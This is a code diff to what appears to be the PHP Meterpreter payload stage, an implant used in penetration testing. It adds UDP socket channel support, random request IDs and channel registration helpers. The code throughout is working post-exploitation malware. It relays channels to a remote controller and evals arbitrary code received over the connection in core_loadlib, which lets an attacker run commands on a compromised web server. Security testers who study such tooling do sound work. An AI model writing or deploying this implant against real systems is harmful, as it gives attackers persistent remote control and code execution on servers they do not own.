@@ -11,6 +11,11 @@ if (!isset($GLOBALS['resource_type_map'])) {
     $GLOBALS['resource_type_map'] = array();
 }
 
+# global map of sockets to the associated peer host.
+if (!isset($GLOBALS['udp_host_map'])) {
+    $GLOBALS['udp_host_map'] = array();
+}
+
 # global list of resources we need to watch in the main select loop
 if (!isset($GLOBALS['readers'])) {
     $GLOBALS['readers'] = array();
@@ -18,8 +23,6 @@ if (!isset($GLOBALS['readers'])) {
 
 function my_print($str) {
     #error_log($str);
-    #print($str ."\n");
-    #flush();
 }
 
 my_print("Evaling main meterpreter stage");
@@ -312,6 +315,7 @@ function core_channel_open($req, &$pkt) {
     # needing to modify the core code.
     $handler = "channel_create_". $type_tlv['value'];
     if ($type_tlv['value'] && is_callable($handler)) {
+        my_print("Calling {$handler}");
         $ret = $handler($req, $pkt);
     } else {
         my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
@@ -321,14 +325,14 @@ function core_channel_open($req, &$pkt) {
     return $ret;
 }
 
+# Works for streams
 function core_channel_eof($req, &$pkt) {
     my_print("doing channel eof");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $c = get_channel_by_id($chan_tlv['value']);
 
     if ($c) {
-        # XXX Doesn't work with sockets.
-        if (@feof($c[1])) {
+        if (eof($c[1])) {
             packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
         } else {
             packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
@@ -339,7 +343,7 @@ function core_channel_eof($req, &$pkt) {
     }
 }
 
-# Works for streams that work with fread
+# Works
 function core_channel_read($req, &$pkt) {
     my_print("doing channel read");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -356,7 +360,7 @@ function core_channel_read($req, &$pkt) {
     return $res;
 }
 
-# Works for streams that work with fwrite
+# Works
 function core_channel_write($req, &$pkt) {
     my_print("doing channel write");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -453,12 +457,12 @@ function core_channel_interact($req, &$pkt) {
 function core_loadlib($req, &$pkt) {
     my_print("doing core_loadlib (no-op)");
     $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
-	if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
-		return ERROR_FAILURE;
-	} else {
-		eval($data_tlv['value']);
-		return ERROR_SUCCESS;
-	}
+    if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
+        return ERROR_FAILURE;
+    } else {
+        eval($data_tlv['value']);
+        return ERROR_SUCCESS;
+    }
 }
 
 
@@ -470,6 +474,16 @@ function core_loadlib($req, &$pkt) {
 # Channel Helper Functions
 ##
 $channels = array();
+
+function register_channel($in, $out=null, $err=null) {
+    global $channels;
+    if ($out == null) { $out = $in; }
+    if ($err == null) { $err = $out; }
+    $id = count($channels);
+    $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in));
+    my_print("Created new channel $in, with id $id");
+    return $id;
+}
 
 function get_channel_id_from_resource($resource) {
     global $channels;
@@ -518,6 +532,17 @@ function channel_read($chan_id, $len) {
 # TLV Helper Functions
 ##
 
+function generate_req_id() {
+    $characters = 'abcdefghijklmnopqrstuvwxyz';
+    $rid = '';
+
+    for ($p = 0; $p < 32; $p++) {
+        $rid .= $characters[rand(0, strlen($characters))];
+    }
+
+    return $rid;
+}
+
 function handle_dead_resource_channel($resource) {
     $cid = get_channel_id_from_resource($resource);
     my_print("Handling dead resource: {$resource}");
@@ -525,8 +550,7 @@ function handle_dead_resource_channel($resource) {
     $pkt = pack("N", PACKET_TYPE_REQUEST);
 
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
-    # XXX Make this random
-    $req_id = str_repeat("A",32);
+    $req_id = generate_req_id();
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
 
@@ -535,17 +559,23 @@ function handle_dead_resource_channel($resource) {
     return $pkt;
 }
 function handle_resource_read_channel($resource, $data) {
+    global $udp_host_map;
     $cid = get_channel_id_from_resource($resource);
     my_print("Handling data from $resource: {$data}");
-    $pkt = pack("N", PACKET_TYPE_REQUEST);
 
+    # Build a new Packet
+    $pkt = pack("N", PACKET_TYPE_REQUEST);
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
-    # XXX Make this random
-    $req_id = str_repeat("A",32);
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
+    $req_id = generate_req_id();
+    if (array_key_exists((int)$resource, $udp_host_map)) {
+        list($h,$p) = $udp_host_map[(int)$resource];
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h));
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p));
+    }
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
 
     # Add the length to the beginning of the packet
     $pkt = pack("N", strlen($pkt) + 4) . $pkt;
@@ -654,61 +684,101 @@ function packet_get_tlv($pkt, $type) {
 ##
 
 
-function register_socket($sock) {
-    global $resource_type_map;
-    my_print("Registering socket $sock");
+function register_socket($sock, $ipaddr=null, $port=null) {
+    global $resource_type_map, $udp_host_map;
+    my_print("Registering socket $sock for ($ipaddr:$port)");
     $resource_type_map[(int)$sock] = 'socket';
+    if ($ipaddr) {
+        $udp_host_map[(int)$sock] = array($ipaddr, $port);
+        #dump_array($udp_host_map, "UDP Map after registering a new socket");
+    }
 }
 
-function register_stream($stream) {
-    global $resource_type_map;
-    my_print("Registering stream $stream");
+# The stream functions cannot be unconnected, so don't require a host map
+function register_stream($stream, $ipaddr=null, $port=null) {
+    global $resource_type_map, $udp_host_map;
+    my_print("Registering stream $stream for ($ipaddr:$port)");
     $resource_type_map[(int)$stream] = 'stream';
+    if ($ipaddr) {
+        $udp_host_map[(int)$stream] = array($ipaddr, $port);
+        #dump_array($udp_host_map, "UDP Map after registering a new stream");
+    }
 }
 
-function connect($ipaddr, $port) {
+function connect($ipaddr, $port, $proto='tcp') {
     my_print("Doing connect($ipaddr, $port)");
     $sock = false;
     # Prefer the stream versions so we don't have to use both select functions
     # unnecessarily, but fall back to socket_create if they aren't available.
     if (is_callable('stream_socket_client')) {
         my_print("stream_socket_client");
-        $sock = stream_socket_client("tcp://{$ipaddr}:{$port}");
+        $sock = stream_socket_client("{$proto}://{$ipaddr}:{$port}");
         if (!$sock) { return false; }
-        register_stream($sock);
+        if ($proto == 'tcp') {
+            register_stream($sock);
+        } elseif ($proto == 'udp') {
+            register_stream($sock, $ipaddr, $port);
+        }
     } else
     if (is_callable('fsockopen')) {
         my_print("fsockopen");
-        $sock = fsockopen($ipaddr,$port);
-        if (!$sock) { return false; }
-        register_stream($sock);
+        if ($proto == 'tcp') {
+            $sock = fsockopen($ipaddr,$port);
+            if (!$sock) { return false; }
+            register_stream($sock);
+        } else {
+            $sock = fsockopen($proto."://".$ipaddr,$port);
+            if (!$sock) { return false; }
+            register_stream($sock, $ipaddr, $port);
+        }
     } elseif (is_callable('socket_create')) {
         my_print("socket_create");
-        $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-        $res = socket_connect($sock, $ipaddr, $port);
-        if (!$res) { return false; }
-        register_socket($sock);
+        if ($proto == 'tcp') {
+            $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            $res = socket_connect($sock, $ipaddr, $port);
+            if (!$res) { return false; }
+            register_socket($sock);
+        } elseif ($proto == 'udp') {
+            $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+            register_socket($sock, $ipaddr, $port);
+        }
     }
 
     return $sock;
 }
 
+function eof($resource) {
+    $ret = false;
+    switch (get_rtype($resource)) {
+    # XXX Doesn't work with sockets.
+    case 'socket': break;
+    case 'stream': $ret = feof($resource); break;
+    }
+    return $ret;
+}
+
 function close($resource) {
     my_print("Closing resource $resource");
-    global $readers, $resource_type_map;
+    global $readers, $resource_type_map, $udp_host_map;
+
     remove_reader($resource);
     switch (get_rtype($resource)) {
-    case 'socket': return socket_close($resource); break;
-    case 'stream': return fclose($resource); break;
+    case 'socket': $ret = socket_close($resource); break;
+    case 'stream': $ret = fclose($resource); break;
     }
     # Every resource should be in the resource type map, but check anyway
     if (array_key_exists((int)$resource, $resource_type_map)) {
-        my_print("Removing $resource from resource_type_map");
         unset($resource_type_map[(int)$resource]);
     }
+    if (array_key_exists((int)$resource, $udp_host_map)) {
+        my_print("Removing $resource from udp_host_map");
+        unset($udp_host_map[(int)$resource]);
+    }
+    return $ret;
 }
 
 function read($resource, $len=null) {
+    global $udp_host_map;
     # Max packet length is magic.  If we're reading a pipe that has data but
     # isn't going to generate any more without some input, then reading less
     # than all bytes in the buffer or 8192 bytes, the next read will never
@@ -717,7 +787,15 @@ function read($resource, $len=null) {
     my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
     $buff = '';
     switch (get_rtype($resource)) {
-    case 'socket': $buff = socket_read($resource, $len, PHP_BINARY_READ); break;
+    case 'socket': 
+        if (array_key_exists((int)$resource, $udp_host_map)) {
+            my_print("Reading UDP socket");
+            list($host,$port) = $udp_host_map[(int)$resource];
+            socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port);
+        } else {
+            $buff = socket_read($resource, $len, PHP_BINARY_READ);
+        }
+        break;
     case 'stream': $buff = fread($resource, $len); break;
     default: my_print("Wtf don't know how to read from resource $resource"); break;
     }
@@ -726,11 +804,20 @@ function read($resource, $len=null) {
 }
 
 function write($resource, $buff, $len=0) {
+    global $udp_host_map;
     if ($len == 0) { $len = strlen($buff); }
     my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
     $count = false;
     switch (get_rtype($resource)) {
-    case 'socket': $count = socket_write($resource, $buff, $len); break;
+    case 'socket': 
+        if (array_key_exists((int)$resource, $udp_host_map)) {
+            my_print("Writing UDP socket");
+            list($host,$port) = $udp_host_map[(int)$resource];
+            $count = socket_sendto($resource, $buff, $len, $host, $port);
+        } else {
+            $count = socket_write($resource, $buff, $len);
+        }
+        break;
     case 'stream': $count = fwrite($resource, $buff, $len); break;
     default: my_print("Wtf don't know how to write to resource $resource"); break;
     }
@@ -915,9 +1002,11 @@ while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
             my_print("not Msgsock: $ready");
             $data = read($ready);
             my_print(sprintf("Read returned %s bytes", strlen($data)));
-            if (false === $data || strlen($data) == 0) {
+            if (false === $data) {
                 $request = handle_dead_resource_channel($ready);
                 write($msgsock, $request);
+                remove_reader($ready);
+            } elseif (strlen($data) == 0) {
                 remove_reader($ready);
             } else {
                 $request = handle_resource_read_channel($ready, $data);
